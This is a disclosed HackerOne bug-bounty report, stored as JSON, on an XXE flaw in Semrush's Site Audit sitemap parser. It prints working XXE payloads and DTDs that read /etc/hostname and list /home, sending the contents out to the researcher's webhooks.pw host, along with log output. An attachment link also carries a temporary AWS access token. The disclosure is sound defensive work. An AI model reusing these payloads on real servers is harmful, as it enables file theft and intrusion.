@@ -1,0 +1,129 @@
+{
+  "id": 312543,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMTI1NDM=",
+  "url": "https://hackerone.com/reports/312543",
+  "title": "XXE in Site Audit function exposing file and directory contents",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2018-02-05T15:10:15.336Z",
+  "submitted_at": "2018-02-05T15:10:15.336Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "ajxchapman",
+    "url": "/ajxchapman",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/ey3f0qnxrppswp9im09fgv2kaecf/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 15966,
+    "url": "https://hackerone.com/semrush",
+    "handle": "semrush",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/y7ptiv6rtfsv5gp8r7xt2fojdx4o/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/y7ptiv6rtfsv5gp8r7xt2fojdx4o/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Semrush",
+      "twitter_handle": "",
+      "website": "https://www.semrush.com/",
+      "about": "Online Visibility Management Platform."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-03-13T14:24:37.574Z",
+  "bug_reporter_agreed_on_going_public_at": "2018-02-14T14:44:49.554Z",
+  "team_member_agreed_on_going_public_at": "2018-03-13T14:24:37.450Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Summary:** \nThe Project Site Audit function is vulnerable to XXE when parsing sitemap.xml files.\n\n**Description:** \nThe Site Audit function spiders a given website and performs analysis on the discovered pages. In order to improve website spidering the URL of a `sitemap.xml` file can be provided. If provided, the `sitemap.xml` file will be downloaded and processed by a Java XML processor.\n\nThe Java xml processor used is vulnerable to XXE attacks. By providing an external document type declaration (DTD) the XML processor can be coerced into processing external entities, for example:\n\n**sitemap.xml**\n```xml\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n <!DOCTYPE foo [  \n   <!ELEMENT foo ANY >\n   <!ENTITY xxe SYSTEM \"http://xxe.webhooks.pw/text.txt\" >]>\n<urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\" \n   xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n   xsi:schemaLocation=\"http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd\">\n    <url>\n        <loc>&xxe;</loc>\n        <lastmod>2006-11-18</lastmod>\n        <changefreq>daily</changefreq>\n        <priority>0.8</priority>\n    </url>\n</urlset>\n```\nWill cause the XML processor to process the external entity at http://xxe.webhooks.pw/text.txt:\n```\n\"███\" - - [05/Feb/2018:13:12:26 +0000] \"GET /text.txt HTTP/1.1\" 302 - \"-\" \"Java/1.8.0_144\"\n```\n\nThis issue can be abused to read arbitrary files and list directory contents from the filesystem of the XML processor application. See the supporting materials below for an example of reading the `/etc/hostname` file and listing the contents of the `/home` directory.\n\n## Browsers Verified In:\n\n* Firefox 58.0.1 (64-bit)\n* Google Chrome 63.0.3239.132 (64-bit)\n\n## Steps To Reproduce:\n\n  1. Create a new project with the domain hosting the malicious `sitemap.xml` file, e.g. `semrush.webhooks.pw`\n  2. Set up a new \"Site Audit\"\n  3. Within \"Site Audit Settings\" change \"Crawl Source\" to \"Enter sitemap URL\" and add the url of the malicious `sitemap.xml` file. An example `sitemap.xml`, e.g. http://static.webhooks.pw/files/semrush_sitemap.xml.\n  4. Start the \"Site Audit\"\n  5. The \"Site Audit\" background process will then kick off, download the provided sitemap.xml file and process it, triggering the XXE vulnerability.\n\nSee the attached screen capture for an example of exploiting this issue. Note, this screen capture is approximately 1 minute long.\n\n## Supporting Material/References:\n### File reading\n**sitemap.xml**\n```xml\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<!DOCTYPE urlset [\n <!ENTITY % goodies SYSTEM \"file:///etc/hostname\">\n <!ENTITY % dtd SYSTEM \"http://dtd.webhooks.pw/files/combine.dtd\">\n%dtd;\n]>\n<urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\" \n   xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n   xsi:schemaLocation=\"http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd\">\n    <url>\n        <loc>http://location.webhooks.pw/resp/&xxe;</loc>\n        <lastmod>2006-11-18</lastmod>\n        <changefreq>daily</changefreq>\n        <priority>0.8</priority>\n    </url>\n</urlset>\n```\n**combine.dtd**\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!ENTITY xxe \"%goodies;\">\n```\n\n**Output:**\n```\n\"46.229.173.66\" - - [05/Feb/2018:14:26:02 +0000] \"GET /resp/███████ HTTP/1.1\" 302 - \"-\" \"Mozilla/5.0 (compatible; SemrushBot-SA/0.97; +http://www.semrush.com/bot.html)\"\n---\n\nDecoded:\n███████\n```\n\n### Directory listing\n**sitemap.xml**\n```xml\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<!DOCTYPE urlset [\n <!ENTITY % goodies SYSTEM \"file:///home/\">\n <!ENTITY % dtd SYSTEM \"http://dtd.webhooks.pw/files/combine.dtd\">\n%dtd;\n]>\n<urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\" \n   xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n   xsi:schemaLocation=\"http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd\">\n    <url>\n        <loc>http://location.webhooks.pw/resp/&xxe;</loc>\n        <lastmod>2006-11-18</lastmod>\n        <changefreq>daily</changefreq>\n        <priority>0.8</priority>\n    </url>\n</urlset>\n```\n**combine.dtd**\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!ENTITY xxe \"%goodies;\">\n```\n\n**Output:**\n```\n\"46.229.173.66\" - - [05/Feb/2018:14:39:35 +0000] \"GET /resp/██████ HTTP/1.1\" 302 - \"-\" \"Mozilla/5.0 (compatible; SemrushBot-SA/0.97; +http://www.semrush.com/bot.html)\"\n---\n\nDecoded:\n██████████\n█████\n█████\ncdh\n█████████\n██████\n███████\n█████\n█████████\n██████████\n███\n████████\nlost found\n███████\n█████████\n█████████\n```\n\n## Impact\n\nThis issue could be abused to identify and list the contents of sensitive files on the Semrush server which implements the Site Audit functionality.",
+  "weakness": {
+    "id": 54,
+    "name": "XML External Entities (XXE)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 260389,
+      "file_name": "semrush_xxe3.gif",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/260/389/a21e56349160c2da6a2fdc002cf319ac998dfe74/semrush_xxe3.gif?response-content-disposition=attachment%3B%20filename%3D%22semrush_xxe3.gif%22%3B%20filename%2A%3DUTF-8%27%27semrush_xxe3.gif&response-content-type=image%2Fgif&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTB3JEE33%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T152505Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJIMEYCIQDnoluxawIPPNMQONkmV4bnr0Mbqh2o%2FoDMn34GDtFlOgIhAIHpNKfOsXjqgrjQOtEkx2paaZiFL5023Gdlp5MkSmzyKroFCOj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzxy1%2FdWHR5D%2Bdt69IqjgUNb1mkoGBX%2BhlyT2Eb%2Fs4ZUq4qxKolZuiC2P88H1RxtAOU12rDyB80MQd8k4XmGwPbDJts6kjdL2MnBtsvXEl6%2Bq9ZQdCg9kEFE4tSbvKtSny%2BiswN38ke3djOgn0h5rKDdf%2BmFQ4KOGj3x%2Be9AMVihBjY1UZtR1nrsvZlLiSnCbGDOfbk2AHtmuYZ0s1q0XiHUB4xSqaleXajj26HynmWY%2Bgn24Cnp25R9UOCBp9HF9eyp3%2FjqqGRv8HJZjo9FqV%2BtyK7HjqC783M1JxFTMozs2xqsLPt1pwVDtNp62ARw4ohnSzeYaVfVqNVWlKv1SIRH%2BmscSz6bGVQrJ%2Bldi3GFyS%2FG2%2B82gMtrCmNNBYxl4S1rVm4WYbrTCHWCxHHxLAmOT%2B0YP05x1EPALNnUtFF55yUgsvjKfPY9E3imxss0QTI%2B%2F3q490hHnn7FVLJxU9AXZNYTnysRChL8fDf18d7%2BmilElqpZs%2BbBc1r1EOLksdwfUslMuNnE3R8hQaiMwPs6JTEZZ1NuhYQxPvL1Djcc4Ol6SjwyyKC%2BletqsGRra4Ls%2BpvgZKI7qNX3VGtJ%2BiRlZyeiD%2BLq%2BQ8kAG0kRRHDvqSgTCtdF6%2FMBECZ5FcP8jNNwzgNfCXgzO%2Be5z9xsvGGGdqFBKcSH%2FgR%2Fb3H8IqzeFnFgWR%2BL5f9MTyORUaC3Ezbm3eA5nTZv40fhXer20DKiTEkwu5JQtoijnshXiCTnDXD4RyiydvJ1SBcNlXqLCzbmE7FvnYd1bE5D2p8g4sKkNHvRJyPiv6MNcCr7TVR81u0io49NPJ%2FX5dtc%2BhuTkK76DiUZOP9qJKZl%2FSPH%2B%2BFEmg8HK7PtMquco%2BeNf26ka4%2BvvxvaqNfQdgdX4w85z9zwY6sAGDr%2BpzYGYl8z7Ow4OKP6Zugtla4ifd%2BVXXZ6lQOIJQc4VuRbAm85TxSIcwg3pmEAY2XL4QiY%2Bd1McmOKKOHq0orlS%2BHrJk47yNkzrWsiD5sTa4WG0t6O8IeQ10ecfUwIz3QzXGA%2B9%2FT8Uitwck6v85Adw99V5yTGpsFcfLTQL2U2wJlqdBXf60ISEbMDaTvHSK7KGSDRmR3WdCwcahbP02%2F8rHTll7MyHjLZBKZ%2FJcxQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=059f9c63b46f270374f2ad8019511a3a88f5347840fc9f4ced15897ab3b758db",
+      "file_size": 1717482,
+      "type": "image/gif",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2018-03-16T14:44:49.674Z",
+  "allow_singular_disclosure_after": -257128815.99159643,
+  "singular_disclosure_allowed": true,
+  "vote_count": 113,
+  "voters": [
+    "h0nith12",
+    "tinmo",
+    "jokebookservice1",
+    "a_d_a_m",
+    "jr0ch17",
+    "drsniper",
+    "debsec",
+    "ajxchapman",
+    "todayisnew-",
+    "cdl",
+    "and 103 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "Team"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
